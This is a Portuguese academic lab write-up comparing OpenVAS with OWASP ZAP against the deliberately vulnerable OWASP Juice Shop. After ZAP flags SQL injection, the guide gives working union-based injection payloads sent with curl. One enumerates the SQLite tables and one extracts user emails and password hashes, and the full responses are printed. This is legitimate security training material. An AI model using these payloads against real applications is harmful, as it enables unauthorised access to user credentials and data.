# Wiki Acadêmica — Laboratório de DAST com OWASP ZAP contra OWASP Juice Shop

**Tema:** comparação prática entre scanner de infraestrutura e scanner DAST em aplicação web vulnerável.  
**Ferramentas centrais:** Docker, OWASP Juice Shop, OWASP ZAP, curl e, opcionalmente, OpenVAS/Greenbone.  
**Finalidade:** documentação acadêmica para reprodução controlada dos testes realizados em laboratório.

> **Aviso de escopo e ética:** este roteiro deve ser executado exclusivamente em ambiente próprio, isolado e autorizado, utilizando aplicações vulneráveis por desenho, como OWASP Juice Shop. A reprodução destes procedimentos contra sistemas de terceiros, sem autorização expressa, é indevida e pode gerar responsabilização técnica, acadêmica, civil e criminal.

---

## 1. Objetivo do laboratório

Este laboratório tem por finalidade demonstrar, de forma técnica e reprodutível, a diferença entre:

1. **scanner de infraestrutura**, voltado à identificação de portas, serviços, versões, CVEs e falhas de configuração do sistema ou serviços expostos; e
2. **scanner DAST**, voltado à análise dinâmica da aplicação web, navegação, interação com parâmetros HTTP, descoberta de endpoints, testes de entrada e validação de vulnerabilidades em camada de aplicação.

No experimento, o OpenVAS/Greenbone apresentou retorno limitado contra o OWASP Juice Shop, enquanto o OWASP ZAP identificou alertas próprios de aplicação web, com destaque para **SQL Injection** no endpoint de busca de produtos.

---

## 2. Ambiente do laboratório

### 2.1. Componentes

| Componente | Função no laboratório |
|---|---|
| Host Linux | Servidor base para execução dos containers e testes via shell |
| Docker | Motor de containers utilizado para subir o alvo e a ferramenta DAST |
| OWASP Juice Shop | Aplicação vulnerável por desenho, utilizada como alvo controlado |
| OWASP ZAP | Scanner DAST utilizado para spidering, active scan e análise de alertas |
| curl | Ferramenta de linha de comando para validação manual das evidências |
| OpenVAS/Greenbone | Scanner de infraestrutura utilizado como comparação metodológica |

### 2.2. Topologia lógica

```text
[Analista]
    |
    | Browser / ZAP GUI / curl
    v
[Host Linux com Docker]
    |-- Container OWASP Juice Shop   -> porta 3000/tcp
    |-- Container OWASP ZAP          -> porta 8080/tcp, interface WebSwing
    |-- Opcional: OpenVAS/Greenbone  -> scanner de infraestrutura
```

### 2.3. Endereços utilizados no laboratório

No teste realizado, o Juice Shop foi acessado pelo endereço interno Docker:

```text
http://172.17.0.2:3000
```

Em outro ambiente, esse IP pode mudar. Para descobrir o IP do container:

```bash
docker ps

docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <nome_ou_id_do_container>
```

Também é possível publicar a aplicação na porta do host e utilizar o IP do servidor:

```text
http://<IP_DO_HOST>:3000
```

---

## 3. Preparação do ambiente

### 3.1. Criação de rede isolada para o laboratório

Recomenda-se o uso de uma rede Docker própria, a fim de manter o laboratório segregado e previsível:

```bash
docker network create lab-dast
```

### 3.2. Subida do OWASP Juice Shop

```bash
docker run -d \
  --name juice-shop \
  --network lab-dast \
  -p 3000:3000 \
  bkimminich/juice-shop
```

Validação inicial:

```bash
docker ps
curl -I http://127.0.0.1:3000
```

Resultado esperado:

```text
HTTP/1.1 200 OK
```

### 3.3. Subida do OWASP ZAP com interface WebSwing

Para uso em laboratório local, foi utilizada a imagem com interface gráfica via navegador:

```bash
docker run -u zap -d \
  --name zap \
  --network lab-dast \
  -p 8080:8080 \
  -p 8443:8443 \
  ghcr.io/zaproxy/zaproxy:full \
  zap-webswing.sh --webswing-disable-auth
```

Acesso à interface:

```text
http://<IP_DO_HOST>:8080/zap/
```

> Observação: o uso de `--webswing-disable-auth` é aceitável apenas em laboratório isolado. Em ambiente compartilhado, deve-se proteger a interface.

---

## 4. Comparação metodológica: OpenVAS x OWASP ZAP

### 4.1. Resultado esperado do OpenVAS/Greenbone

O OpenVAS/Greenbone é vocacionado à análise de infraestrutura. Seu foco natural recai sobre:

- portas expostas;
- banners de serviços;
- versões conhecidamente vulneráveis;
- problemas de TLS/SSL;
- configurações inseguras de serviços;
- CVEs de sistema operacional e componentes expostos.

No caso do OWASP Juice Shop, as vulnerabilidades mais relevantes estão na lógica da aplicação e nos endpoints de API. Por isso, o retorno do OpenVAS tende a ser inferior ao esperado quando o alvo é uma aplicação SPA moderna, baseada em JavaScript/Angular/Node.

### 4.2. Resultado esperado do OWASP ZAP

O OWASP ZAP, por ser DAST, atua de maneira mais aderente ao problema analisado. Ele permite:

- navegação automatizada com spider tradicional;
- navegação dinâmica com AJAX Spider;
- identificação de parâmetros HTTP;
- envio de payloads controlados;
- identificação de falhas de cabeçalhos;
- detecção de SQL Injection, XSS e outras vulnerabilidades web.

---

## 5. Configuração do scan no OWASP ZAP

### 5.1. Quick Start — Automated Scan

Na tela inicial do ZAP, preencher:

| Campo | Valor utilizado |
|---|---|
| URL to attack | `http://172.17.0.2:3000` ou `http://<IP_DO_HOST>:3000` |
| Scan Policy | `Dev Standard`, `Default Policy` ou política equivalente de laboratório |
| Use traditional spider | Marcado |
| Use ajax spider | `If Modern` ou habilitado |
| Browser | Firefox |

Evidência visual do setup:

![Tela de configuração do Automated Scan no OWASP ZAP](imagens/01-zap-quick-start.png)

### 5.2. Execução

Após clicar em **Attack**, o ZAP realiza as seguintes etapas:

1. spider tradicional para descoberta de recursos estáticos;
2. AJAX Spider para navegação em aplicação moderna;
3. active scan contra os endpoints e parâmetros identificados;
4. consolidação dos alertas na aba **Alerts**.

---

## 6. Vulnerabilidade identificada: SQL Injection

### 6.1. Alerta apresentado pelo ZAP

O ZAP identificou alerta de **SQL Injection** no seguinte recurso:

```text
URL: http://172.17.0.2:3000/rest/products/search?q=%27%28
Parâmetro: q
Risco: High
Confiança: Low
CWE: 89
WASC: 19
Evidência: HTTP/1.1 500 Internal Server Error
Fonte: Active Scan
Input Vector: URL Query String
```

Evidência visual do alerta:

![Alerta de SQL Injection no OWASP ZAP](imagens/02-zap-alert-sqli.png)

### 6.2. Interpretação técnica

O alerta indica que o parâmetro `q`, utilizado na busca de produtos, aceitou entrada malformada e produziu comportamento anômalo no backend. O retorno de erro SQL no servidor sugere ausência de tratamento adequado da entrada, com possibilidade de concatenação insegura de dados recebidos do usuário na consulta SQL.

---

## 7. Validação manual com curl

### 7.1. Teste inicial com aspa simples

Comando:

```bash
curl -i "http://172.17.0.2:3000/rest/products/search?q='"
```

Resultado observado:

```text
HTTP/1.1 200 OK
{"status":"success","data":[]}
```

Interpretação: a aspa simples isolada não foi suficiente para produzir erro no teste manual inicial, embora o ZAP tenha identificado comportamento suspeito em variações de payload.

### 7.2. Forçando erro de sintaxe SQL

Comando:

```bash
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')));"
```

Resultado observado:

```text
HTTP/1.1 500 Internal Server Error
Error: SQLITE_ERROR: near ")": syntax error
OWASP Juice Shop (Express ^4.22.1)
```

Interpretação:

- a aplicação retornou erro interno;
- houve exposição de detalhe do banco SQLite;
- houve exposição da tecnologia backend Express;
- o erro reforça a hipótese de tratamento inadequado do parâmetro `q`.

---

## 8. Prova de conceito controlada: Union-Based SQL Injection

### 8.1. Enumeração de tabelas via `sqlite_master`

No SQLite, a enumeração de tabelas não é realizada por `SHOW TABLES`, como no MySQL, mas por consulta à tabela de metadados `sqlite_master`.

Comando utilizado:

```bash
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')) UNION SELECT name, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master WHERE type='table'-- "
```

Resultado observado:

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 21576
ETag: W/"5448-6SbQMEuFuOGWKG4rV+GiDaAjxbI"
Vary: Accept-Encoding
Date: Thu, 07 May 2026 01:37:19 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-05-06 14:03:18.889 +00:00","updatedAt":"2026-05-06 14:03:18.889 +00:00","deletedAt":null},{"id":2,"name":"Orange Juice (1000ml)","description":"Made from oranges hand-picked by Uncle Dittmeyer.","price":2.99,"deluxePrice":2.49,"image":"orange_juice.jpg","createdAt":"2026-05-06 14:03:18.889 +00:00","updatedAt":"2026-05-06 14:03:18.889 +00:00","deletedAt":null},{"id":3,"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"deluxePrice":8.99,"image":"eggfruit_juice.jpg","createdAt":"2026-05-06 14:03:18.889 +00:00","updatedAt":"2026-05-06 14:03:18.889 +00:00","deletedAt":null},{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"deluxePrice":4.99,"image":"raspberry_juice.jpg","createdAt":"2026-05-06 14:03:18.889 +00:00","updatedAt":"2026-05-06 14:03:18.889 +00:00","deletedAt":null},{"id":5,"name":"Lemon Juice (500ml)","description":"Sour but full of vitamins.","price":2.99,"deluxePrice":1.99,"image":"lemon_juice.jpg","createdAt":"2026-05-06 14:03:18.890 +00:00","updatedAt":"2026-05-06 14:03:18.890 +00:00","deletedAt":null},{"id":6,"name":"Banana Juice (1000ml)","description":"Monkeys love it the most.","price":1.99,"deluxePrice":1.99,"image":"banana_juice.jpg","createdAt":"2026-05-06 14:03:18.890 +00:00","updatedAt":"2026-05-06 14:03:18.890 +00:00","deletedAt":null},{"id":7,"name":"OWASP Juice Shop T-Shirt","description":"Real fans wear it 24/7!","price":22.49,"deluxePrice":22.49,"image":"fan_shirt.jpg","createdAt":"2026-05-06 14:03:18.890 +00:00","updatedAt":"2026-05-06 14:03:18.890 +00:00","deletedAt":null},{"id":8,"name":"OWASP Juice Shop CTF Girlie-Shirt","description":"For serious Capture-the-Flag heroines only!","price":22.49,"deluxePrice":22.49,"image":"fan_girlie.jpg","createdAt":"2026-05-06 14:03:18.890 +00:00","updatedAt":"2026-05-06 14:03:18.890 +00:00","deletedAt":null},{"id":9,"name":"OWASP SSL Advanced Forensic Tool (O-Saft)","description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://www.owasp.org/index.php/O-Saft\" target=\"_blank\">More...</a>","price":0.01,"deluxePrice":0.01,"image":"orange_juice.jpg","createdAt":"2026-05-06 14:03:18.890 +00:00","updatedAt":"2026-05-06 14:03:18.890 +00:00","deletedAt":null},{"id":10,"name":"Christmas Super-Surprise-Box (2014 Edition)","description":"Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)","price":29.99,"deluxePrice":29.99,"image":"undefined.jpg","createdAt":"2026-05-06 14:03:18.890 +00:00","updatedAt":"2026-05-06 14:03:18.890 +00:00","deletedAt":"2026-05-06 14:03:18.902 +00:00"},{"id":11,"name":"Rippertuer Special Juice","description":"Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br />This item has been made unavailable because of lack of safety standards. (This product is unsafe! We plan to remove it from the stock!)","price":16.99,"deluxePrice":16.99,"image":"undefined.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":"2026-05-06 14:03:18.903 +00:00"},{"id":12,"name":"OWASP Juice Shop Sticker (2015/2016 design)","description":"Die-cut sticker with the official 2015/2016 logo. By now this is a rare collectors item. <em>Out of stock!</em>","price":999.99,"deluxePrice":999.99,"image":"sticker.png","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":"2026-05-06 14:03:18.903 +00:00"},{"id":13,"name":"OWASP Juice Shop Iron-Ons (16pcs)","description":"Upgrade your clothes with washer safe <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">iron-ons</a> of the OWASP Juice Shop or CTF Extension logo!","price":14.99,"deluxePrice":14.99,"image":"iron-on.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":14,"name":"OWASP Juice Shop Magnets (16pcs)","description":"Your fridge will be even cooler with these OWASP Juice Shop or CTF Extension logo <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">magnets</a>!","price":15.99,"deluxePrice":15.99,"image":"magnets.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":15,"name":"OWASP Juice Shop Sticker Page","description":"Massive decoration opportunities with these OWASP Juice Shop or CTF Extension <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">sticker pages</a>! Each page has 16 stickers on it.","price":9.99,"deluxePrice":9.99,"image":"sticker_page.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":16,"name":"OWASP Juice Shop Sticker Single","description":"Super high-quality vinyl <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">sticker single</a> with the OWASP Juice Shop or CTF Extension logo! The ultimate laptop decal!","price":4.99,"deluxePrice":4.99,"image":"sticker_single.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":17,"name":"OWASP Juice Shop Temporary Tattoos (16pcs)","description":"Get one of these <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">temporary tattoos</a> to proudly wear the OWASP Juice Shop or CTF Extension logo on your skin! If you tweet a photo of yourself with the tattoo, you get a couple of our stickers for free! Please mention <a href=\"https://twitter.com/owasp_juiceshop\" target=\"_blank\"><code>@owasp_juiceshop</code></a> in your tweet!","price":14.99,"deluxePrice":14.99,"image":"tattoo.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":18,"name":"OWASP Juice Shop Mug","description":"Black mug with regular logo on one side and CTF logo on the other! Your colleagues will envy you!","price":21.99,"deluxePrice":21.99,"image":"fan_mug.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":19,"name":"OWASP Juice Shop Hoodie","description":"Mr. Robot-style apparel. But in black. And with logo.","price":49.99,"deluxePrice":49.99,"image":"fan_hoodie.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":20,"name":"OWASP Juice Shop-CTF Velcro Patch","description":"4x3.5\" embroidered patch with velcro backside. The ultimate decal for every tactical bag or backpack!","price":2.92,"deluxePrice":2.92,"image":"velcro-patch.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":21,"name":"Woodruff Syrup \"Forest Master X-Treme\"","description":"Harvested and manufactured in the Black Forest, Germany. Can cause hyperactive behavior in children. Can cause permanent green tongue when consumed undiluted.","price":6.99,"deluxePrice":6.99,"image":"woodruff_syrup.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":22,"name":"Green Smoothie","description":"Looks poisonous but is actually very good for your health! Made from green cabbage, spinach, kiwi and grass.","price":1.99,"deluxePrice":1.99,"image":"green_smoothie.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":23,"name":"Quince Juice (1000ml)","description":"Juice of the <em>Cydonia oblonga</em> fruit. Not exactly sweet but rich in Vitamin C.","price":4.99,"deluxePrice":4.99,"image":"quince.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":24,"name":"Apple Pomace","description":"Finest pressings of apples. Allergy disclaimer: Might contain traces of worms. Can be <a href=\"/#recycle\">sent back to us</a> for recycling.","price":0.89,"deluxePrice":0.89,"image":"apple_pressings.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":25,"name":"Fruit Press","description":"Fruits go in. Juice comes out. Pomace you can send back to us for recycling purposes.","price":89.99,"deluxePrice":89.99,"image":"fruit_press.jpg","createdAt":"2026-05-06 14:03:18.891 +00:00","updatedAt":"2026-05-06 14:03:18.891 +00:00","deletedAt":null},{"id":26,"name":"OWASP Juice Shop Logo (3D-printed)","description":"This rare item was designed and handcrafted in Sweden. This is why it is so incredibly expensive despite its complete lack of purpose.","price":99.99,"deluxePrice":99.99,"image":"3d_keychain.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":27,"name":"Juice Shop Artwork","description":"Unique masterpiece painted with different kinds of juice on 90g/m² lined paper.","price":278.74,"deluxePrice":278.74,"image":"artwork.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":"2026-05-06 14:03:18.911 +00:00"},{"id":28,"name":"Global OWASP WASPY Award 2017 Nomination","description":"Your chance to nominate up to three quiet pillars of the OWASP community ends 2017-06-30! <a href=\"https://www.owasp.org/index.php/WASPY_Awards_2017\">Nominate now!</a>","price":0.03,"deluxePrice":0.03,"image":"waspy.png","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":"2026-05-06 14:03:18.912 +00:00"},{"id":29,"name":"Strawberry Juice (500ml)","description":"Sweet & tasty!","price":3.99,"deluxePrice":3.99,"image":"strawberry_juice.jpeg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":30,"name":"Carrot Juice (1000ml)","description":"As the old German saying goes: \"Carrots are good for the eyes. Or has anyone ever seen a rabbit with glasses?\"","price":2.99,"deluxePrice":2.99,"image":"carrot_juice.jpeg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":31,"name":"OWASP Juice Shop Sweden Tour 2017 Sticker Sheet (Special Edition)","description":"10 sheets of Sweden-themed stickers with 15 stickers on each.","price":19.1,"deluxePrice":19.1,"image":"stickersheet_se.png","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":"2026-05-06 14:03:18.913 +00:00"},{"id":32,"name":"Pwning OWASP Juice Shop","description":"<em>The official Companion Guide</em> by Björn Kimminich available <a href=\"https://leanpub.com/juice-shop\">for free on LeanPub</a> and also <a href=\"https://pwning.owasp-juice.shop\">readable online</a>!","price":5.99,"deluxePrice":5.99,"image":"cover_small.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":33,"name":"Melon Bike (Comeback-Product 2018 Edition)","description":"The wheels of this bicycle are made from real water melons. You might not want to ride it up/down the curb too hard.","price":2999,"deluxePrice":2999,"image":"melon_bike.jpeg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":34,"name":"OWASP Juice Shop Coaster (10pcs)","description":"Our 95mm circle coasters are printed in full color and made from thick, premium coaster board.","price":19.99,"deluxePrice":19.99,"image":"coaster.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":35,"name":"OWASP Snakes and Ladders - Web Applications","description":"This amazing web application security awareness board game is <a href=\"https://steamcommunity.com/sharedfiles/filedetails/?id=1969196030\">available for Tabletop Simulator on Steam Workshop</a> now!","price":0.01,"deluxePrice":0.01,"image":"snakes_ladders.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":36,"name":"OWASP Snakes and Ladders - Mobile Apps","description":"This amazing mobile app security awareness board game is <a href=\"https://steamcommunity.com/sharedfiles/filedetails/?id=1970691216\">available for Tabletop Simulator on Steam Workshop</a> now!","price":0.01,"deluxePrice":0.01,"image":"snakes_ladders_m.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":37,"name":"OWASP Juice Shop Holographic Sticker","description":"Die-cut holographic sticker. Stand out from those 08/15-sticker-covered laptops with this shiny beacon of 80's coolness!","price":2,"deluxePrice":2,"image":"holo_sticker.png","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":38,"name":"OWASP Juice Shop \"King of the Hill\" Facemask","description":"Facemask with compartment for filter from 50% cotton and 50% polyester.","price":13.49,"deluxePrice":13.49,"image":"fan_facemask.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":39,"name":"Juice Shop Adversary Trading Card (Common)","description":"Common rarity \"Juice Shop\" card for the <a href=\"https://docs.google.com/forms/d/e/1FAIpQLSecLEakawSQ56lBe2JOSbFwFYrKDCIN7Yd3iHFdQc5z8ApwdQ/viewform\">Adversary Trading Cards</a> CCG.","price":2.99,"deluxePrice":0.99,"image":"ccg_common.png","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":"2026-05-06 14:03:18.917 +00:00"},{"id":40,"name":"Juice Shop Adversary Trading Card (Super Rare)","description":"Super rare \"Juice Shop\" card with holographic foil-coating for the <a href=\"https://docs.google.com/forms/d/e/1FAIpQLSecLEakawSQ56lBe2JOSbFwFYrKDCIN7Yd3iHFdQc5z8ApwdQ/viewform\">Adversary Trading Cards</a> CCG.","price":99.99,"deluxePrice":69.99,"image":"ccg_foil.png","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":"2026-05-06 14:03:18.918 +00:00"},{"id":41,"name":"Juice Shop \"Permafrost\" 2020 Edition","description":"Exact version of <a href=\"https://github.com/juice-shop/juice-shop/releases/tag/v9.3.1-PERMAFROST\">OWASP Juice Shop that was archived on 02/02/2020</a> by the GitHub Archive Program and ultimately went into the <a href=\"https://github.blog/2020-07-16-github-archive-program-the-journey-of-the-worlds-open-source-code-to-the-arctic\">Arctic Code Vault</a> on July 8. 2020 where it will be safely stored for at least 1000 years.","price":9999.99,"deluxePrice":9999.99,"image":"permafrost.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":42,"name":"Best Juice Shop Salesman Artwork","description":"Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restaurant supplies, voodoo enhanced asbestos and courtroom souvenirs before <em>finally</em> adding his expertise to the Juice Shop marketing team.","price":5000,"deluxePrice":5000,"image":"artwork2.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":43,"name":"OWASP Juice Shop Card (non-foil)","description":"Mythic rare <em>(obviously...)</em> card \"OWASP Juice Shop\" with three distinctly useful abilities. Alpha printing, mint condition. A true collectors piece to own!","price":1000,"deluxePrice":1000,"image":"card_alpha.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":44,"name":"20th Anniversary Celebration Ticket","description":"Get your <a href=\"https://20thanniversary.owasp.org/\" target=\"_blank\">free 🎫 for OWASP 20th Anniversary Celebration</a> online conference! Hear from world renowned keynotes and special speakers, network with your peers and interact with our event sponsors. With an anticipated 10k+ attendees from around the world, you will not want to miss this live on-line event!","price":1e-20,"deluxePrice":1e-20,"image":"20th.jpeg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":"2026-05-06 14:03:18.920 +00:00"},{"id":45,"name":"OWASP Juice Shop LEGO™ Tower","description":"Want to host a Juice Shop CTF in style? Build <a href=\"https://github.com/OWASP/owasp-swag/blob/master/projects/juice-shop/lego/OWASP%20JuiceShop%20Pi-server%201.2.pdf\" target=\"_blank\">your own LEGO™ tower</a> which holds four Raspberry Pi 4 models with PoE HAT modules <a href=\"https://github.com/juice-shop/multi-juicer/blob/main/guides/raspberry-pi/raspberry-pi.md\" target=\"_blank\">running a MultiJuicer Kubernetes cluster</a>! Wire to a switch and connect to your network to have an out-of-the-box ready CTF up in no time!","price":799,"deluxePrice":799,"image":"lego_case.jpg","createdAt":"2026-05-06 14:03:18.892 +00:00","updatedAt":"2026-05-06 14:03:18.892 +00:00","deletedAt":null},{"id":46,"name":"DSOMM & Juice Shop User Day Ticket","description":"You are going to the OWASP Global AppSec San Francisco 2024? <a href=\"https://www.eventbrite.com/e/owasp-global-appsec-san-francisco-2024-tickets-723699172707\" target=\"_blank\">Get a ticket*</a> for this amazing side event as well! Check the juice-packed agenda <a href=\"https://owasp.org/www-project-juice-shop/#div-userday2024\" target=\"_blank\">here</a> for all the details!<br /><br />*=scroll down to <strong>Elevate: DSOMM and Juice Shop User Day (Sept. 25)</strong> after clicking <em>Get Tickets</em> on Eventbrite. Ticket price set to only covers fees for room, AV, and catering throughout the day.","price":55.2,"deluxePrice":55.2,"image":"user_day_ticket.png","createdAt":"2026-05-06 14:03:18.893 +00:00","updatedAt":"2026-05-06 14:03:18.893 +00:00","deletedAt":"2026-05-06 14:03:18.922 +00:00"},{"id":"Addresses","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"BasketItems","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Baskets","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Captchas","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Cards","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Challenges","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Complaints","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Deliveries","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Feedbacks","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Hints","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"ImageCaptchas","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Memories","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"PrivacyRequests","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Products","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Quantities","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Recycles","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"SecurityAnswers","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"SecurityQuestions","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Users","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"Wallets","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"},{"id":"sqlite_sequence","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}]}
```

Tabelas identificadas no retorno JSON:

| Tabela | Observação acadêmica |
|---|---|
| Users | Cadastro de usuários |
| Products | Produtos da loja |
| Baskets | Cestas/carrinhos |
| BasketItems | Itens de carrinho |
| Cards | Cartões fictícios da aplicação de teste |
| Wallets | Carteiras/saldos fictícios |
| SecurityAnswers | Respostas de segurança |
| SecurityQuestions | Perguntas de segurança |
| Feedbacks | Feedbacks da aplicação |
| Challenges | Desafios internos do Juice Shop |
| sqlite_sequence | Controle interno do SQLite |

### 8.2. Exfiltração acadêmica de dados da tabela `Users`

Comando utilizado em laboratório:

```bash
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')) UNION SELECT email, password, '3', '4', '5', '6', '7', '8', '9' FROM Users-- "
```

Resultado observado:

```text
HTTP/1.1 200 OK
```

Exemplos de registros retornados:

| Campo projetado no JSON | Valor observado |
|---|---|
| id | `admin@juice-sh.op` |
| name | `0192023a7bbd73250516f069df18b500` |
| id | `jim@juice-sh.op` |
